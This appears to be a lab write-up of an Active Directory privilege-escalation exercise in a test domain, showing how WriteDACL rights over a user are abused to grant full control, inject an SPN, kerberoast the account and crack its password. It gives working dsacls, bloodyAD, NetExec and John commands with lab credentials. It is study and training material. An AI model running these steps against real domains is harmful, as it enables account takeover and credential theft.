WriteDACL on User


DACL Abuse (WriteDACL on User)

  1. 1.

    1. Hypothesis & Vulnerability Identification

Hypothesis: After compromising tanjiro_kamado21, we analyzed their privileges within the domain. We hypothesized that this user might have the ability to modify the Access Control Lists (ACLs) of other objects, a powerful privilege known as WriteDACL.

Findings: BloodHound analysis confirmed a WriteDacl edge from tanjiro_kamado21 to the user sasuke_uchiha99.

Impact: WriteDacl is critical because it allows the attacker to rewrite the target's permissions. Effectively, the attacker can grant themselves "Full Control" or "GenericAll" over the victim, enabling any subsequent attack (Password Reset, Targeted Kerberoasting, etc.).

  1. 2.

    2. Vulnerability Configuration (Lab Setup)

Objective: To simulate this scenario, we manually modified the ACL of sasuke_uchiha99 to grant Write Permissions to Tanjiro.

  • Tool Used: dsacls.exe

  • Command:

dsacls.exe "CN=sasuke_uchiha99,CN=Users,DC=shinobi,DC=local" /G shinobi\tanjiro_kamado21:WP

(Note: :WP stands for "Write Permissions", which maps to WriteDACL in BloodHound).

  • Verification: The output confirms tanjiro_kamado21 has WRITE PERMISSIONS (listed under Special Access).

  1. 3.

    3. Data Collection (Ingestion)

Objective: Refresh the BloodHound database to ensure the new ACL path is visible.

Execution:

bloodhound-python -u tanjiro_kamado21 -p Hinokami@456 -ns 192.168.56.10 -d shinobi.local -c All

  1. 4.

    4. Exploitation: Modifying the DACL (Granting Full Control)

Hypothesis: "Since we possess WriteDACL over the target user sasuke_uchiha99, we can modify their Access Control List (ACL) to grant ourselves explicit Full Control. This permanently escalates our privileges over the user object, removing any restrictions."

Attack Execution:

  • Objective: Abuse WriteDACL to add an Access Control Entry (ACE) granting FullControl to tanjiro_kamado21.

  • Tools: This can be performed using tools like dacledit.py (Impacket) or bloodyAD.

  • Verification: After executing the attack, we verified the permissions again using dsacls.exe on the Domain Controller.

Findings:

  • Before: Tanjiro only had WRITE PERMISSIONS.

  • After: The dsacls output confirms that shinobi\tanjiro_kamado21 now possesses FULL CONTROL over sasuke_uchiha99. This successful DACL modification effectively makes Tanjiro an owner of the account.

  1. 5. 5.

    Attack Execution: Targeted Kerberoasting

Strategy: Since we can modify the DACL, we technically have "Full Control". To prove this impact, we will execute a Targeted Kerberoasting attack. This involves:

  1. Using our privileges to write a servicePrincipalName (SPN) to the victim's account.

  1. Requesting a Kerberos TGS ticket for that SPN.

  1. Cracking the ticket to reveal the password.

Step 1: Inject SPN (Exploitation) Tool: bloodyAD Command:

Bash

bloodyAD -d shinobi.local --host 192.168.56.10 -u 'tanjiro_kamado21' -p 'Hinokami@456' set object "sasuke_uchiha99" servicePrincipalName -v 'http/anything'

Result: The tool successfully updated Sasuke's servicePrincipalName attribute. This confirms that our WriteDACL rights allowed us to modify the target object's properties.

  1. 6. 6

    . Roasting & Cracking (Privilege Escalation)

Step 2: Kerberoasting Tool: NetExec (nxc) Command:

nxc ldap 192.168.56.10 -d shinobi.local -u 'tanjiro_kamado21' -p 'Hinokami@456' --kerberoasting kerberoastables.txt

Result: NetExec successfully requested and retrieved the TGS ticket for sasuke_uchiha99, saving it to a file.

Step 3: Cracking the Hash Tool: John the Ripper Command:

Bash

john --show kerberoastables.txt

Findings:

  • Password Found: Sharingan#321

  • Conclusion: We successfully escalated privileges from tanjiro_kamado21 to sasuke_uchiha99 by abusing the WriteDACL permission.
